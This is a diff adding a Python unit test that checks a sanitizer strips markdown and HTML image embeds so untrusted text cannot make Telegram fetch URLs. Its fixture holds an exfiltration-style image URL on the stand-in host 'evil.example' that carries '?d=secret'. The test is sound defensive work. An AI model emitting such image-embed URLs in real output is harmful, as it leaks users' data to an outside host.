@@ -64,3 +64,15 @@ def test_split_keeps_code_indentation() -> None:
     chunks = split_text(code, 60)
     assert all(not chunk.startswith("x") for chunk in chunks[1:])
     assert chunks[1].startswith("    x = 1")
+
+
+def test_untrusted_markdown_cannot_make_telegram_fetch_urls() -> None:
+    text = (
+        '![](https://evil.example/?d=secret "cap") ![x][ref] <img src="https://evil.example/a.png">'
+        " ![22:45](tg://time?unix=1647531900) [ok](https://t.me/)"
+    )
+    cleaned = sanitize_untrusted(text)
+    assert "![" not in cleaned.replace("![22:45](tg://", "") and "<img" not in cleaned
+    assert '[link](https://evil.example/?d=secret "cap")' in cleaned and "[x][ref]" in cleaned
+    assert "![22:45](tg://time?unix=1647531900)" in cleaned and "[ok](https://t.me/)" in cleaned
+    assert sanitize_untrusted("!![](https://e/x)") == "[link](https://e/x)"  # no media reassembled
